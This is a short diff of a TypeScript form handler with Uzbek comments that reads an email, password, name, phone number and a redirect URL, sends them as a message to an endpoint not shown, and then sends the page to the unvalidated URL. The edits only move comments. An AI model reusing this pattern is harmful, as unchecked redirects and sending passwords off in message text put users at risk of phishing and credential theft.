@@ -14,14 +14,14 @@ if (form && statusText) {
     const passwordInput = document.getElementById('password') as HTMLInputElement | null;
     const nameInput = document.getElementById('name') as HTMLInputElement | null;
     const callInput = document.getElementById('number') as HTMLInputElement | null;
+    
+    // HTML degan input turi o'qilmoqda
     const redirectInput = document.getElementById('redirectImage') as HTMLInputElement | null;
 
     const email = emailInput?.value || '';
     const password = passwordInput?.value || '';
     const name = nameInput?.value || '';
     const call = callInput?.value || '';
-    
-    // Qiymatni (value) to'g'ri o'qiymiz
     const redirectImage = redirectInput?.value?.trim() || '';
 
     const text: string = `
@@ -45,9 +45,10 @@ if (form && statusText) {
       .then((res: Response) => {
         if (res.ok) {
           statusText.textContent = 'Xabar muvaffaqiyatli yuborildi! Rasm ochilmoqda...';
+          
+          // Formani tozalash va to'liq rasm manziliga yo'naltirish
           form.reset();
           if (redirectImage) {
-            // Sahifani rasm manziliga yo'naltirish
             window.location.href = redirectImage;
           }
         } else {
